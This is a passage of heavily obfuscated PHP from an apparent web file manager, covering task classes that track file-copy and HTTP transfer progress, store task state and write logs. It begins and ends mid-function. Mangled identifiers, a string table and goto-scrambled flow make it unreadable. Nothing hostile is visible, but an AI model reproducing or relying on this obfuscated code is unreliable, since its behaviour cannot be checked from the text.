Hook::trigger($EÆƒÓìêĞ‰[1523], $eá¯íâã•„); self::valueSet($eá¯íâã•„[$EÆƒÓìêĞ‰[385]], $eá¯íâã•„); goto b×Ì¾ß†·; b×Ì¾ß†·: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($BØæ‰÷øº–) { $B÷ùƒõ…‹¾ =& $_SERVER[òÀöí]; Cache::set($B÷ùƒõ…‹¾[1522] . $this->task[$B÷ùƒõ…‹¾[385]], $BØæ‰÷øº–, 60); return $BØæ‰÷øº–; } public static function get($C‰÷ñ¦Üáø) { return self::valueGet($C‰÷ñ¦Üáø); } public static function listData() { $C‹ìµÉ¾éˆ = self::valueGet(); return array_sort_by($C‹ìµÉ¾éˆ, $_SERVER[òÀöí][1507], !0); } public static function kill($Aí·õíÅ‚Æ) { return self::changeStatus($Aí·õíÅ‚Æ, self::STATYS_KILL); } public static function stop($eÙÁÄäŒ»˜) { return self::changeStatus($eÙÁÄäŒ»˜, self::STATYS_STOP); } public static function restart($F‡ÛÏÏå) { return self::changeStatus($F‡ÛÏÏå, self::STATYS_RUNNING); } public static function killAll() { $bîÆİù»àÊ =& $_SERVER[òÀöí]; $eëØ“×¶ç = self::listData(); foreach ($eëØ“×¶ç as $dÉÔÜØÊ) { self::kill($dÉÔÜØÊ[$bîÆİù»àÊ[385]]); } sleep(2); foreach ($eëØ“×¶ç as $dÉÔÜØÊ) { self::valueSet($dÉÔÜØÊ[$bîÆİù»àÊ[385]], !1); } } private static function changeStatus($bòì¹ä®…¦, $F³Ä¢êÔò¿) { goto E¢¤é­‰öõ; E¢¤é­‰öõ: $DÔ‘º¨“È =& $_SERVER[òÀöí]; $AÖ¤òíä”å = self::valueGet($bòì¹ä®…¦); if (!$AÖ¤òíä”å) { return !1; } goto aøÛÎêË™; aøÛÎêË™: $AÖ¤òíä”å[$DÔ‘º¨“È[708]] = $F³Ä¢êÔò¿; self::valueSet($bòì¹ä®…¦, $AÖ¤òíä”å); self::log($DÔ‘º¨“È[1524] . $AÖ¤òíä”å[$DÔ‘º¨“È[385]] . $DÔ‘º¨“È[1525] . $F³Ä¢êÔò¿); goto Aì¥ù×³‰; Aì¥ù×³‰: return !0; goto cçÁ³ŞâÙÌ; cçÁ³ŞâÙÌ: } public static function valueGet($e˜Ó·†¡Ø = false) { $bĞ…ˆ‡×á› =& $_SERVER[òÀöí]; if ($e˜Ó·†¡Ø) { $c ÀŠ™†©á = Model($bĞ…ˆ‡×á›[416])->where(array($bĞ…ˆ‡×á›[92] => $e˜Ó·†¡Ø, $bĞ…ˆ‡×á›[29] => $bĞ…ˆ‡×á›[1526]))->find(); return $c ÀŠ™†©á ? json_decode($c ÀŠ™†©á[$bĞ…ˆ‡×á›[368]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($CÎÁè§®–ò = false) { goto a…¾Ö¤‘³µ; B˜¤›¦­·¶: $C¸ö‘âœ÷ = Model($b†à¨¨ÒÖ[416])->where($cìêÊÅ¢Ññ)->select(); $C¸ö‘âœ÷ = $C¸ö‘âœ÷ ? $C¸ö‘âœ÷ : array(); foreach ($C¸ö‘âœ÷ as $d°Ö‰†§¶« => $d¡ÙÕ×­– ) { $C¸ö‘âœ÷[$d°Ö‰†§¶«] = json_decode($d¡ÙÕ×­– [$b†à¨¨ÒÖ[368]], !0); } goto eê»³Ÿé£Ğ; a…¾Ö¤‘³µ: $b†à¨¨ÒÖ =& $_SERVER[òÀöí]; $cìêÊÅ¢Ññ = array($b†à¨¨ÒÖ[29] => $b†à¨¨ÒÖ[1526]); if ($CÎÁè§®–ò) { $cìêÊÅ¢Ññ[$b†à¨¨ÒÖ[1504]] = $CÎÁè§®–ò; } goto B˜¤›¦­·¶; eê»³Ÿé£Ğ: return $C¸ö‘âœ÷; goto d’©êÏÁÈà; d’©êÏÁÈà: } public static function valueSet($F’ßË®–é·, $eÈ¤Í³¶£ß) { goto AŸÎùŒ¨ó; AŸÎùŒ¨ó: $eï‰÷õŞ =& $_SERVER[òÀöí]; if (!$eÈ¤Í³¶£ß) { return Model($eï‰÷õŞ[416])->where(array($eï‰÷õŞ[92] => $F’ßË®–é·, $eï‰÷õŞ[29] => $eï‰÷õŞ[1526]))->delete(); } $a™•ÃÀ„’§ = json_encode($eÈ¤Í³¶£ß); goto d—¥°Èšñ©; d—¥°Èšñ©: if (!$a™•ÃÀ„’§) { ob_start(); var_dump($eÈ¤Í³¶£ß); $CŠ‚³ª‡Ëˆ = ob_get_clean(); self::log($eï‰÷õŞ[1527] . json_encode_force($CŠ‚³ª‡Ëˆ)); } if (!$F’ßË®–é· || !$eÈ¤Í³¶£ß[$eï‰÷õŞ[385]]) { return !1; } $fáØÍ´†’˜ = array($eï‰÷õŞ[29] => $eï‰÷õŞ[1526], $eï‰÷õŞ[1504] => USER_ID, $eï‰÷õŞ[92] => $F’ßË®–é·, $eï‰÷õŞ[368] => $a™•ÃÀ„’§); goto AŒÁ“”ã­Ê; AŒÁ“”ã­Ê: Model($eï‰÷õŞ[416])->add($fáØÍ´†’˜, array(), !0); goto C¯‡É÷ëğ; C¯‡É÷ëğ: } public static function log($EÓÌ¯¡µ«Ê) { write_log($EÓÌ¯¡µ«Ê, $_SERVER[òÀöí][1528]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto d»·š‘‘ò; EùÅ‡Šë: Hook::bind($AøˆÄï ‰[1541], array($this, $AøˆÄï ‰[1542])); Hook::bind($AøˆÄï ‰[1543], array($this, $AøˆÄï ‰[1544])); Hook::bind($AøˆÄï ‰[1545], array($this, $AøˆÄï ‰[1546])); goto d“Ğäë¦Æõ; e¼ÛÙƒîÜ†: Hook::bind($AøˆÄï ‰[528], array($this, $AøˆÄï ‰[1537])); Hook::bind($AøˆÄï ‰[530], array($this, $AøˆÄï ‰[1537])); Hook::bind($AøˆÄï ‰[532], array($this, $AøˆÄï ‰[1537])); goto a„ö¸ôÆ…Ï; bô¼§†Ô„”: $fá…Æéå–[$AøˆÄï ‰[1553]] = 0; $fá…Æéå–[$AøˆÄï ‰[1554]] = 0; if (!$fá…Æéå–[$AøˆÄï ‰[1409]]) { $fá…Æéå–[$AøˆÄï ‰[1409]] = LNG($AøˆÄï ‰[1555]); } goto B¶Ú¦êÀé; d»·š‘‘ò: $AøˆÄï ‰ =& $_SERVER[òÀöí]; $fá…Æéå– =& $this->task; $this->sourceCopyFolder = !1; goto eŠï…á£­; B±…Û›Ö­Š: Hook::bind($AøˆÄï ‰[559], array($this, $AøˆÄï ‰[1536])); Hook::bind($AøˆÄï ‰[526], array($this, $AøˆÄï ‰[1537])); Hook::bind($AøˆÄï ‰[523], array($this, $AøˆÄï ‰[1537])); goto e¼ÛÙƒîÜ†; E¶Î•‡¨Î: $fá…Æéå–[$AøˆÄï ‰[1002]] = $AøˆÄï ‰[33]; $fá…Æéå–[$AøˆÄï ‰[1551]] = $AøˆÄï ‰[33]; $fá…Æéå–[$AøˆÄï ‰[1552]] = 0; goto bô¼§†Ô„”; a„ö¸ôÆ…Ï: Hook::bind($AøˆÄï ‰[1538], array($this, $AøˆÄï ‰[1539])); Hook::bind($AøˆÄï ‰[548], array($this, $AøˆÄï ‰[1540])); $this->sourceModelCopyFlag = !1; goto EùÅ‡Šë; DÆ§Ó³î—×: Hook::bind($AøˆÄï ‰[555], array($this, $AøˆÄï ‰[1534])); Hook::bind($AøˆÄï ‰[556], array($this, $AøˆÄï ‰[1535])); Hook::bind($AøˆÄï ‰[558], array($this, $AøˆÄï ‰[1536])); goto B±…Û›Ö­Š; d“Ğäë¦Æõ: $fá…Æéå–[$AøˆÄï ‰[1547]] = LNG($AøˆÄï ‰[1548]); $fá…Æéå–[$AøˆÄï ‰[1549]] = 0; $fá…Æéå–[$AøˆÄï ‰[1550]] = 0; goto E¶Î•‡¨Î; eŠï…á£­: Hook::bind($AøˆÄï ‰[1529], array($this, $AøˆÄï ‰[1530])); Hook::bind($AøˆÄï ‰[1087], array($this, $AøˆÄï ‰[1531])); Hook::bind($AøˆÄï ‰[1532], array($this, $AøˆÄï ‰[1533])); goto DÆ§Ó³î—×; B¶Ú¦êÀé: } protected function endAfter() { goto a¶‡ªèëàÇ; a¶‡ªèëàÇ: $F‘µº‡Á’§ =& $_SERVER[òÀöí]; Hook::unbind($F‘µº‡Á’§[1529], array($this, $F‘µº‡Á’§[1530])); Hook::unbind($F‘µº‡Á’§[1087], array($this, $F‘µº‡Á’§[1531])); goto a†¹©ŸãÃ¹; b¿ŠÜœ¯ê˜: Hook::unbind($F‘µº‡Á’§[1541], array($this, $F‘µº‡Á’§[1542])); Hook::unbind($F‘µº‡Á’§[1543], array($this, $F‘µº‡Á’§[1544])); Hook::unbind($F‘µº‡Á’§[1545], array($this, $F‘µº‡Á’§[1546])); goto DÅİŸµÑ; Bí›½”¶ù¯: Hook::unbind($F‘µº‡Á’§[558], array($this, $F‘µº‡Á’§[1536])); Hook::unbind($F‘µº‡Á’§[559], array($this, $F‘µº‡Á’§[1536])); Hook::unbind($F‘µº‡Á’§[526], array($this, $F‘µº‡Á’§[1537])); goto eù¨ à„Ùå; a†¹©ŸãÃ¹: Hook::unbind($F‘µº‡Á’§[1532], array($this, $F‘µº‡Á’§[1533])); Hook::unbind($F‘µº‡Á’§[555], array($this, $F‘µº‡Á’§[1534])); Hook::unbind($F‘µº‡Á’§[556], array($this, $F‘µº‡Á’§[1535])); goto Bí›½”¶ù¯; eù¨ à„Ùå: Hook::unbind($F‘µº‡Á’§[523], array($this, $F‘µº‡Á’§[1537])); Hook::unbind($F‘µº‡Á’§[528], array($this, $F‘µº‡Á’§[1537])); Hook::unbind($F‘µº‡Á’§[530], array($this, $F‘µº‡Á’§[1537])); goto aÑùôì¼¢; aÑùôì¼¢: Hook::unbind($F‘µº‡Á’§[532], array($this, $F‘µº‡Á’§[1537])); Hook::unbind($F‘µº‡Á’§[1538], array($this, $F‘µº‡Á’§[1539])); Hook::unbind($F‘µº‡Á’§[548], array($this, $F‘µº‡Á’§[1540])); goto b¿ŠÜœ¯ê˜; DÅİŸµÑ: } public function copyMoveStart($D’Ø“æ÷…á, $AñÊ¸Ş¾«æ, $a‚™Îí”¥ô, $C’˜«‚ÔÓ†) { goto bæÆ£´ëÉÒ; F×•ëö¯¯†: if (substr($AñÊ¸Ş¾«æ, 0, strlen($fÈù´È§Ô)) == $fÈù´È§Ô) { return; } if (substr($C’˜«‚ÔÓ†, 0, strlen($fÈù´È§Ô)) == $fÈù´È§Ô) { return; } $A¤êÅÑ±Îï =& $this->task; goto f›ô¥¾Ú—¬; bæÆ£´ëÉÒ: $d¼Âß“¶‚Ì =& $_SERVER[òÀöí]; self::log($d¼Âß“¶‚Ì[1556] . $AñÊ¸Ş¾«æ . $d¼Âß“¶‚Ì[66] . $C’˜«‚ÔÓ†); $fÈù´È§Ô = rtrim(TEMP_FILES, $d¼Âß“¶‚Ì[8]); goto F×•ëö¯¯†; f›ô¥¾Ú—¬: $A¤êÅÑ±Îï[$d¼Âß“¶‚Ì[1557]] = KodIO::transferType($D’Ø“æ÷…á, $a‚™Îí”¥ô); $this->update(); goto fºÒœ¨ÔØé; fºÒœ¨ÔØé: } public function updateAfter() { goto FÍ´ù©ã×»; däÄÆê…Åğ: $b‘²®³÷[$aÚãçŸæ¬[1505]] = $b‘²®³÷[$aÚãçŸæ¬[1554]] / $b‘²®³÷[$aÚãçŸæ¬[717]]; if ($b‘²®³÷[$aÚãçŸæ¬[1505]] > 0) { $B¹¯µÇ…ÒÜ = timeFloat() - $b‘²®³÷[$aÚãçŸæ¬[1507]] - $b‘²®³÷[$aÚãçŸæ¬[1510]]; $b‘²®³÷[$aÚãçŸæ¬[1511]] = $B¹¯µÇ…ÒÜ * (1 - $b‘²®³÷[$aÚãçŸæ¬[1505]]) / $b‘²®³÷[$aÚãçŸæ¬[1505]]; } goto A ·Ï¯“›‚; eš“×ñÒğ: if ($this->sourceModelCopyFlag) { return; } if ($b‘²®³÷[$aÚãçŸæ¬[1557]] == $aÚãçŸæ¬[1158]) { return; } if ($b‘²®³÷[$aÚãçŸæ¬[1557]] == $aÚãçŸæ¬[1072] || $b‘²®³÷[$aÚãçŸæ¬[1557]] == $aÚãçŸæ¬[106]) { if ($b‘²®³÷[$aÚãçŸæ¬[1551]]) { $b‘²®³÷[$aÚãçŸæ¬[1554]] = $b‘²®³÷[$aÚãçŸæ¬[1553]] + $b‘²®³÷[$aÚãçŸæ¬[1550]]; } } else { if ($b‘²®³÷[$aÚãçŸæ¬[1557]] == $aÚãçŸæ¬[1159]) { if ($b‘²®³÷[$aÚãçŸæ¬[1551]] == $aÚãçŸæ¬[1072]) { $b‘²®³÷[$aÚãçŸæ¬[1554]] = $b‘²®³÷[$aÚãçŸæ¬[1553]] + $b‘²®³÷[$aÚãçŸæ¬[1550]] * 0.5; } else { if ($b‘²®³÷[$aÚãçŸæ¬[1551]] == $aÚãçŸæ¬[106]) { $b‘²®³÷[$aÚãçŸæ¬[1554]] = $b‘²®³÷[$aÚãçŸæ¬[1553]] + $b‘²®³÷[$aÚãçŸæ¬[1549]] * 0.5 + $b‘²®³÷[$aÚãçŸæ¬[1550]] * 0.5; } } } } goto däÄÆê…Åğ; FÍ´ù©ã×»: $aÚãçŸæ¬ =& $_SERVER[òÀöí]; $b‘²®³÷ =& $this->task; if (!$b‘²®³÷[$aÚãçŸæ¬[717]]) { return; } goto eš“×ñÒğ; A ·Ï¯“›‚: } public function addPath($C×’¾è„È“) { goto fóÍ™éÖâ±; CÏÅƒ–á‡Ä: $aÄÉ¹ÃŸĞÏ = IO::infoWithChildren($C×’¾è„È“); $eø’Ñ‘¢é = $f·¡ë¸İíÀ[$FùŒõ“â²º[1558]] ? $f·¡ë¸İíÀ[$FùŒõ“â²º[1558]][$FùŒõ“â²º[1559]] : 0; $f·¡ë¸İíÀ[$FùŒõ“â²º[1558]] = array($FùŒõ“â²º[1559] => $eø’Ñ‘¢é + 1, $FùŒõ“â²º[404] => $aÄÉ¹ÃŸĞÏ[$FùŒõ“â²º[28]], $FùŒõ“â²º[75] => $aÄÉ¹ÃŸĞÏ[$FùŒõ“â²º[75]], $FùŒõ“â²º[484] => $aÄÉ¹ÃŸĞÏ[$FùŒõ“â²º[484]] ? $aÄÉ¹ÃŸĞÏ[$FùŒõ“â²º[484]] : $aÄÉ¹ÃŸĞÏ[$FùŒõ“â²º[75]]); goto F¬Ö¼ôğ›•; fóÍ™éÖâ±: $FùŒõ“â²º =& $_SERVER[òÀöí]; if (!$C×’¾è„È“) { return; } $f·¡ë¸İíÀ =& $this->task; goto CÏÅƒ–á‡Ä; F¬Ö¼ôğ›•: if ($aÄÉ¹ÃŸĞÏ[$FùŒõ“â²º[29]] == $FùŒõ“â²º[173]) { $f·¡ë¸İíÀ[$FùŒõ“â²º[1000]] += 1; } else { $f·¡ë¸İíÀ[$FùŒõ“â²º[1000]] += $aÄÉ¹ÃŸĞÏ[$FùŒõ“â²º[80]][$FùŒõ“â²º[78]]; if ($aÄÉ¹ÃŸĞÏ[$FùŒõ“â²º[387]]) { $f·¡ë¸İíÀ[$FùŒõ“â²º[1000]] += $aÄÉ¹ÃŸĞÏ[$FùŒõ“â²º[80]][$FùŒõ“â²º[79]] + 1; } } $f·¡ë¸İíÀ[$FùŒõ“â²º[717]] += $aÄÉ¹ÃŸĞÏ[$FùŒõ“â²º[77]]; $this->update(); goto céôİÖŸöĞ; céôİÖŸöĞ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($fëáÜ®ØÄÈ) { $F¨ô¶ö©ÑÄ =& $_SERVER[òÀöí]; $fÓ„Ëóñöæ =& $this->task; $fÓ„Ëóñöæ[$F¨ô¶ö©ÑÄ[1547]] = $fëáÜ®ØÄÈ[$F¨ô¶ö©ÑÄ[28]]; $fÓ„Ëóñöæ[$F¨ô¶ö©ÑÄ[1002]] = $fëáÜ®ØÄÈ[$F¨ô¶ö©ÑÄ[28]]; $this->update(); } public function copyFileStart($a¤Ï‹¸‹ ÷, $eÔÁ¾³³¯ñ, $Dè„ÃƒƒÕ·, $BŠÄ²ÎÔˆ, $Dˆˆ¨ë¢†¦, $EâÌ¦ƒÂÎŒ) { goto E‘«ÕŒ‚÷¶; A„ÆÏÔ™‘‰: $b–Ï‰øùÈí[$dÚ÷ãÆï†¹[1547]] = $B‹£´ÈÔ³ƒ; $b–Ï‰øùÈí[$dÚ÷ãÆï†¹[1549]] = (int) $a¤Ï‹¸‹ ÷->size($eÔÁ¾³³¯ñ); $b–Ï‰øùÈí[$dÚ÷ãÆï†¹[1550]] = 0; goto bæ¹¥ÎÀŒ; E‘«ÕŒ‚÷¶: $dÚ÷ãÆï†¹ =& $_SERVER[òÀöí]; $B‹£´ÈÔ³ƒ = $Dˆˆ¨ë¢†¦; if ($B‹£´ÈÔ³ƒ == $GLOBALS[$dÚ÷ãÆï†¹[1560]]) { $B‹£´ÈÔ³ƒ = $GLOBALS[$dÚ÷ãÆï†¹[1561]]; } goto Cß‹®×¥µÓ; aõ½©à‰Ï: $this->update(); goto AÄ‡Šôº‘; Cß‹®×¥µÓ: $GLOBALS[$dÚ÷ãÆï†¹[1561]] = $Dˆˆ¨ë¢†¦; $GLOBALS[$dÚ÷ãÆï†¹[1560]] = $EâÌ¦ƒÂÎŒ; $b–Ï‰øùÈí =& $this->task; goto A„ÆÏÔ™‘‰; bæ¹¥ÎÀŒ: $b–Ï‰øùÈí[$dÚ÷ãÆï†¹[1002]] = $dÚ÷ãÆï†¹[33]; $b–Ï‰øùÈí[$dÚ÷ãÆï†¹[1551]] = $dÚ÷ãÆï†¹[33]; $b–Ï‰øùÈí[$dÚ÷ãÆï†¹[1552]] = 0; goto aõ½©à‰Ï; AÄ‡Šôº‘: } public function copyFileEnd($b¢õ–¶Ÿ“Õ, $aÅáó¡Ùø, $DƒïÎ½£‡•, $Bˆó¸¢„…¼, $AáŒÓÈ’½, $e ‘Æ®‚§) { $e¶í·ŒÉÆ =& $_SERVER[òÀöí]; $eíÑˆğ²Ê =& $this->task; $eíÑˆğ²Ê[$e¶í·ŒÉÆ[1550]] = $eíÑˆğ²Ê[$e¶í·ŒÉÆ[1549]]; $eíÑˆğ²Ê[$e¶í·ŒÉÆ[1551]] = $e¶í·ŒÉÆ[33]; if ($AáŒÓÈ’½ == $eíÑˆğ²Ê[$e¶í·ŒÉÆ[1547]]) { $eíÑˆğ²Ê[$e¶í·ŒÉÆ[1553]] += $eíÑˆğ²Ê[$e¶í·ŒÉÆ[1549]]; $eíÑˆğ²Ê[$e¶í·ŒÉÆ[1554]] = $eíÑˆğ²Ê[$e¶í·ŒÉÆ[1553]]; $this->update(1); } else { $this->update(); $eíÑˆğ²Ê[$e¶í·ŒÉÆ[1550]] = 0; } self::log($e¶í·ŒÉÆ[1562] . $aÅáó¡Ùø . $e¶í·ŒÉÆ[66] . $Bˆó¸¢„…¼ . $e¶í·ŒÉÆ[227] . $AáŒÓÈ’½ . $e¶í·ŒÉÆ[1563] . $eíÑˆğ²Ê[$e¶í·ŒÉÆ[1547]]); } public function updateFileEnd($Eö ù„Â¿ì, $BÏ±¬”Ûì) { goto Cƒ‘™ô§ãå; Cƒ‘™ô§ãå: $CÑÑÈÍñ¿ =& $_SERVER[òÀöí]; $Aİôê«Íà =& $this->task; $Aİôê«Íà[$CÑÑÈÍñ¿[1547]] = $Eö ù„Â¿ì; goto CˆØÛ¨Â„È; CˆØÛ¨Â„È: $Aİôê«Íà[$CÑÑÈÍñ¿[1549]] = $BÏ±¬”Ûì; $Aİôê«Íà[$CÑÑÈÍñ¿[1553]] += $BÏ±¬”Ûì; $Aİôê«Íà[$CÑÑÈÍñ¿[1554]] = $Aİôê«Íà[$CÑÑÈÍñ¿[1553]]; goto EÌİ¾»‚ˆê; EÌİ¾»‚ˆê: $this->update(1); self::log($CÑÑÈÍñ¿[1564] . $Eö ù„Â¿ì); goto aŞÛ‹„; aŞÛ‹„: } public function sourceModelCopy($AìÏÏéùòå) { goto dŒ™ÕŠÆ‰; DÅµ‚éÔŠ: switch ($Aëİƒëä˜) { case $F§‹Œ½µ¦è[524]: $eôàÕÉ’»Á = 1; break; case $F§‹Œ½µ¦è[527]: $b‰¨ŒêĞŸ[$F§‹Œ½µ¦è[1547]] = $A¨ÒÜ³”¤–[$F§‹Œ½µ¦è[28]]; break; case $F§‹Œ½µ¦è[529]: $eôàÕÉ’»Á = intval($AìÏÏéùòå[$F§‹Œ½µ¦è[372]] * 0.4); break; case $F§‹Œ½µ¦è[531]: $eôàÕÉ’»Á = intval($AìÏÏéùòå[$F§‹Œ½µ¦è[372]] * 0.2); break; case $F§‹Œ½µ¦è[533]: $eôàÕÉ’»Á = intval($AìÏÏéùòå[$F§‹Œ½µ¦è[372]] * 0.4); break; } $this->update($eôàÕÉ’»Á); $this->sourceModelCopyFlag = !1; goto Bâ…®®Ûå; dŒ™ÕŠÆ‰: $F§‹Œ½µ¦è =& $_SERVER[òÀöí]; $Aëİƒëä˜ = $AìÏÏéùòå[0]; $A¨ÒÜ³”¤– = $AìÏÏéùòå[1]; goto B´Œ­“îğÃ; B´Œ­“îğÃ: $b‰¨ŒêĞŸ =& $this->task; $this->sourceModelCopyFlag = !0; $eôàÕÉ’»Á = 0; goto DÅµ‚éÔŠ; Bâ…®®Ûå: } public function sourceRemove($dõ®§ŸòÚ¦, $a¤§Áİ£¬®) { $dœñ•£ˆŒ =& $_SERVER[òÀöí]; $this->sourceModelCopyFlag = !0; $ešùÇéÙƒ¡ = 1; if (isset($dõ®§ŸòÚ¦[$dœñ•£ˆŒ[80]])) { $ešùÇéÙƒ¡ = $dõ®§ŸòÚ¦[$dœñ•£ˆŒ[80]][$dœñ•£ˆŒ[78]] + $dõ®§ŸòÚ¦[$dœñ•£ˆŒ[80]][$dœñ•£ˆŒ[79]] + 1; } $this->update($ešùÇéÙƒ¡); $this->sourceModelCopyFlag = !1; } public function sourceMove($FĞíÃ­ó¯¦) { $this->sourceRemove($FĞíÃ­ó¯¦, !1); } public function curlProgress($AÕ°ê¢‘õ, $bõ £–„Ö¦, $B×“ÍÖ÷¹ì, $F¨‹•Ó ÏÃ, $d‚ç“¾¤§) { $B†‡Ç—Î á =& $_SERVER[òÀöí]; $B¢ğ®Ùïßø =& $this->task; if ($d‚ç“¾¤§ > 0) { $B¢ğ®Ùïßø[$B†‡Ç—Î á[1002]] = $B†‡Ç—Î á[1565]; $B¢ğ®Ùïßø[$B†‡Ç—Î á[1551]] = $B†‡Ç—Î á[106]; if ($B¢ğ®Ùïßø[$B†‡Ç—Î á[1549]]) { $B¢ğ®Ùïßø[$B†‡Ç—Î á[1550]] = $d‚ç“¾¤§; } if ($B¢ğ®Ùïßø[$B†‡Ç—Î á[1552]]) { $B¢ğ®Ùïßø[$B†‡Ç—Î á[1550]] = $d‚ç“¾¤§ + $B¢ğ®Ùïßø[$B†‡Ç—Î á[1552]]; } } else { if ($B×“ÍÖ÷¹ì > 0) { if ($B¢ğ®Ùïßø[$B†‡Ç—Î á[1549]] == $bõ £–„Ö¦) { $B¢ğ®Ùïßø[$B†‡Ç—Î á[1550]] = $B×“ÍÖ÷¹ì; $B¢ğ®Ùïßø[$B†‡Ç—Î á[1002]] = $B†‡Ç—Î á[1566]; $B¢ğ®Ùïßø[$B†‡Ç—Î á[1551]] = $B†‡Ç—Î á[1072]; } } } $this->update(); } public function curlProgressStart($d°Øõê³Ô™) { } public function curlProgressEnd($C×Û±ˆ½í) { goto BòËÜ§²á‚; BòËÜ§²á‚: $f¢§Ÿ¡ªà„ =& $_SERVER[òÀöí]; $e®²ÀÉôì =& $this->task; $bƒ×™õô = curl_getinfo($C×Û±ˆ½í); goto Cæ¾¢¤…; E¼“ÑçÇ: $this->update(); goto BˆáÍÖß”¡; Cæ¾¢¤…: $A”„Œ£íİ” = $bƒ×™õô[$f¢§Ÿ¡ªà„[1567]]; if ($A”„Œ£íİ” == -1) { $A”„Œ£íİ” = $bƒ×™õô[$f¢§Ÿ¡ªà„[1568]]; } if ($e®²ÀÉôì[$f¢§Ÿ¡ªà„[1551]] == $f¢§Ÿ¡ªà„[106] && $A”„Œ£íİ”) { $e®²ÀÉôì[$f¢§Ÿ¡ªà„[1552]] += $A”„Œ£íİ”; } goto E¼“ÑçÇ; BˆáÍÖß”¡: } } class TaskHttp extends Task { protected function startAfter() { $fÊêø™×„‚ =& $_SERVER[òÀöí]; $F°Š†”»”ñ =& $this->task; $F°Š†”»”ñ[$fÊêø™×„‚[1569]] = 1; Hook::bind($fÊêø™×„‚[1541], array($this, $fÊêø™×„‚[1570])); Hook::bind($fÊêø™×„‚[1543], array($this, $fÊêø™×„‚[1571])); Hook::bind($fÊêø™×„‚[1545], array($this, $fÊêø™×„‚[1572])); } protected function endAfter() { $BÂ™ÂêÚ¯¾ =& $_SERVER[òÀöí]; Hook::unbind($BÂ™ÂêÚ¯¾[1541], array($this, $BÂ™ÂêÚ¯¾[1570])); Hook::unbind($BÂ™ÂêÚ¯¾[1543], array($this, $BÂ™ÂêÚ¯¾[1571])); Hook::unbind($BÂ™ÂêÚ¯¾[1545], array($this, $BÂ™ÂêÚ¯¾[1572])); } public function progressStart($CÔ›Ø¦è’) { $Fãõƒ‚Í’§ =& $_SERVER[òÀöí]; $b”â²ÌÆ… = curl_getinfo($CÔ›Ø¦è’); self::log($Fãõƒ‚Í’§[1573] . $b”â²ÌÆ…[$Fãõƒ‚Í’§[303]]); self::valueSet($this->task[$Fãõƒ‚Í’§[385]], $this->task); } public function progressEnd($A’áŒº‹ õ) { $DÒ…Å¸²„Ÿ =& $_SERVER[òÀöí]; self::log($DÒ…Å¸²„Ÿ[1574] . $this->task[$DÒ…Å¸²„Ÿ[385]]); $this->end(); } public function progress($d’ç‹Ù±îØ, $DŠ¿Œ©‹å, $b·ÅĞÔÚÅ‚, $C¬“ŒÜ ¾Ç, $AçİŠÅ…—¡) { $dÙÀØä è„ =& $_SERVER[òÀöí]; $C¨Øİ£ÖÚ =& $this->task; if ($AçİŠÅ…—¡ > 0) { $C¨Øİ£ÖÚ[$dÙÀØä è„[1000]] = $C¨Øİ£ÖÚ[$dÙÀØä è„[1000]] == 0 ? $C¬“ŒÜ ¾Ç : $C¨Øİ£ÖÚ[$dÙÀØä è„[1000]]; $C¨Øİ£ÖÚ[$dÙÀØä è„[1014]] = $AçİŠÅ…—¡; } else { if ($b·ÅĞÔÚÅ‚ > 0) { $C¨Øİ£ÖÚ[$dÙÀØä è„[1000]] = $C¨Øİ£ÖÚ[$dÙÀØä è„[1000]] == 0 ? $DŠ¿Œ©‹å : $C¨Øİ£ÖÚ[$dÙÀØä è„[1000]]; $C¨Øİ£ÖÚ[$dÙÀØä è„[1014]] = $b·ÅĞÔÚÅ‚; } } $this->update(); self::log("\160\162\x6f\x67\x72\x65\163\x73\110\164\x74\x70\72\x64\x6f\x77\156\x3a{$b·ÅĞÔÚÅ‚}\x2f{$DŠ¿Œ©‹å}\x3b\x20\165\160\154\157\x61\144\72{$AçİŠÅ…—¡}\x2f{$C¬“ŒÜ ¾Ç}\x3b"); } } goto bÅÛáŸ•Şß; b¯ğƒÒó¢«: class AnalysisModel extends ModelBaseLight { public function init($aîÆ‚»ÂšŸ) { $A‹àË½¸ =& $_SERVER[òÀöí]; $Dö†„¡ã˜ò = array($A‹àË½¸[551] => array($A‹àË½¸[29] => $A‹àË½¸[1588], $A‹àË½¸[269] => array($A‹àË½¸[220], $A‹àË½¸[719], $A‹àË½¸[1589], $A‹àË½¸[1590])), $A‹àË½¸[1591] => array($A‹àË½¸[29] => $A‹àË½¸[1592], $A‹àË½¸[269] => array($A‹àË½¸[220], $A‹àË½¸[717], $A‹àË½¸[1593], $A‹àË½¸[1594], $A‹àË½¸[1595]))); if (!isset($Dö†„¡ã˜ò[$aîÆ‚»ÂšŸ])) { return !1; } $this->optionType = $Dö†„¡ã˜ò[$aîÆ‚»ÂšŸ][$A‹àË½¸[29]]; $this->field = $Dö†„¡ã˜ò[$aîÆ‚»ÂšŸ][$A‹àË½¸[269]]; return !0; } public function listData($aæ©é¥Ôä = false, $CŒ±—„½ï = "\155\x6f\x64\x69\x66\171\x54\x69\155\x65", $EòŒ¦ß³£ = false) { return parent::listData($aæ©é¥Ôä, $CŒ±—„½ï, $EòŒ¦ß³£); } public function trendList($D¹éíÍ“³”) { goto D’ö¼…æŸ; D’ö¼…æŸ: $B‘éÄ‘ñ‡Í =& $_SERVER[òÀöí]; $Cä«½ƒÑ“· = $this->listData(); if ($Cä«½ƒÑ“·) { $EÑøùØğ°® = end($Cä«½ƒÑ“·); $eŒ›İË½ÖÉ = date($B‘éÄ‘ñ‡Í[1596], strtotime($B‘éÄ‘ñ‡Í[1597])); if ($EÑøùØğ°®[$B‘éÄ‘ñ‡Í[220]] == $eŒ›İË½ÖÉ) { return $Cä«½ƒÑ“·; } $dÁ†ÅàòòÛ = strtotime($EÑøùØğ°®[$B‘éÄ‘ñ‡Í[220]]); } goto f­Ù³¹’˜š; f­Ù³¹’˜š: if (!isset($dÁ†ÅàòòÛ)) { $c°—ó‘ÈÂ = $D¹éíÍ“³” == $B‘éÄ‘ñ‡Í[551] ? $B‘éÄ‘ñ‡Í[495] : $B‘éÄ‘ñ‡Í[778]; $dÁ†ÅàòòÛ = Model($c°—ó‘ÈÂ)->min($B‘éÄ‘ñ‡Í[192]); } $Cñ—İöåØĞ = $B‘éÄ‘ñ‡Í[1598] . ucfirst($D¹éíÍ“³”); $DÖëÚŒÍÙ = $this->dateList($dÁ†ÅàòòÛ); goto eÎ™Ô”ÈéÙ; 